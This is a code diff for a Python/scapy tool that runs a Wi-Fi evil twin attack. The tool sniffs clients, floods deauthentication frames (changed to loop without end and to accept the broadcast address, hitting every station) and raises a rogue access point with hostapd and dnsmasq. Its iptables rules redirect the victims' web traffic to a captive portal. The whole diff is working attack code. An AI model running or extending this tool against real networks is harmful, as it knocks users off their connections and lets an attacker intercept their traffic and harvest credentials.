@@ -15,7 +15,7 @@ from scapy.layers.dhcp import DHCP
 from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
 from scapy.layers.http import HTTPRequest
 from scapy.layers.l2 import Ether
-
+stop_thread = False
 interface = ''
 mac = ''
 victim = ''
@@ -72,9 +72,9 @@ def arg_parse():
 # switch interface to monitor mode
 def monitor_mode(iface):
     try:
-        os.system('sudo ifconfig ' + str(iface) + ' down')
-        os.system('sudo iwconfig ' + str(iface) + ' mode monitor')
-        os.system('sudo ifconfig ' + str(iface) + ' up')
+        os.system('ifconfig ' + str(iface) + ' down')
+        os.system('iwconfig ' + str(iface) + ' mode monitor')
+        os.system('ifconfig ' + str(iface) + ' up')
     except:
         print("Make sure that this interface " + iface + " supports monitor mode")
 
@@ -184,8 +184,8 @@ def sniffer(iface, ch):
     timeout = time.time() + 60  # a minute  from now
     while True:
         os.system("iwconfig " + iface + " channel " + str(from_ch))  # switch channel
-        from_ch = from_ch % to_ch + 1
         sniff(prn=handler, iface=iface, timeout=1)
+        from_ch = from_ch % to_ch + 1
         if time.time() > timeout:
             break
 
@@ -231,9 +231,8 @@ def deauth(target_mac, iface, count):
     bssid = client_AP[target_mac]['BSSID']
     dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
     frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
-    os.system("iwconfig " + iface + " channel " + str(client_AP[target_mac]['channel']))
     print("[+] started deauth attack...")
-    sendp(frame, iface=iface, count=count, inter=.1, verbose=1)
+    sendp(frame, iface=iface, loop=1, inter=.1, verbose=0)
 
 
 def configHostapd(iface, net):
@@ -285,10 +284,10 @@ def configDnsmasq(iface):
     os.system('ifconfig ' + iface + ' 192.168.1.1 netmask 255.255.255.0')
     # route http traffic to captive portal page
     os.system(
-        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 80 -j DNAT --to-destination 192.168.1.1')
+        'iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 80 -j DNAT --to-destination 192.168.1.1')
     # route https traffic to captive portal page
     os.system(
-        'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 443 -j DNAT --to-destination 192.168.1.1')
+        'iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 443 -j DNAT --to-destination 192.168.1.1')
     # Initialize dnsmasq
     os.system('dnsmasq -C ' + dnsmasqConfigFile)
     print('[+] dnsmasq successfully configured')
@@ -334,13 +333,16 @@ def sniff_dhcp(iface):
 
 def sig_handler(signum, frame):
     global interface
+    global stop_thread
     os.system("killall dnsmasq")
     os.system("killall hostapd")
     os.system('iptables -F')
     os.system('iptables -t nat -F')
+    os.system("iw dev mon0 del")
     # os.system("ifconfig " + str(interface) + " 10.0.0.12")
     os.system("rm dnsmasq.conf")
     os.system("rm hostapd.conf")
+
     print("Bye")
     sys.exit()
 
@@ -351,6 +353,8 @@ if __name__ == "__main__":
     progress()
     os.system('clear')
     time.sleep(1)
+    os.system("iw dev " + interface + " interface add mon0 type monitor")
+    os.system("ifconfig mon0 up")
     monitor_mode(interface)
     mac = mon_mac(interface)
     print("[+]Interface switched to monitor mode")
@@ -370,15 +374,17 @@ if __name__ == "__main__":
 
     output_client(network)
     victim = input("enter the mac address of the station you want to attack: ")
-    while victim.lower() not in client_AP:
+    while victim.lower() not in client_AP and victim.lower() != 'ff:ff:ff:ff:ff:ff':
         victim = input("station not found choose one from the list please: ")
     time.sleep(1)
     config_portal()
+    os.system("iwconfig mon0 " + " channel " + str(client_AP[victim]['channel']))
     time.sleep(1)
-    deauth(victim, interface, count)
     configHostapd(interface, network)
     time.sleep(1)
     configDnsmasq(interface)
+    Thread(target=deauth, args=(victim, 'mon0', count)).start()
+
     time.sleep(1)
     signal.signal(signal.SIGINT, sig_handler)
     print("[+]scanning activities in our access point if you want to stop press ctrl-c...")
